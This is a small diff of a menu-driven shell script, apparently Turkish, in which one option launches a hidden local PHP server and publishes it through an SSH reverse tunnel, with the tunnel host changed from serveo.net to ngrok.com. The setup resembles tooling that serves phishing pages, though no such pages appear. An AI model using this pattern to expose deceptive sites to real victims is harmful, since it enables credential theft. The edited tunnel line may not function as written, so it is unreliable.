@@ -48,7 +48,7 @@ don(){
 		php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 		sleep 3 &&
 		ls
-		ssh -R 80:localhost:3333 $random@serveo.net  2>&1 & sleep 5
+		ssh -R 80:localhost:3333 $random@ngrok.com  2>&1 & sleep 5
 		don
 
 	elif [[ $islem == 02 || $islem == 2 ]]; then
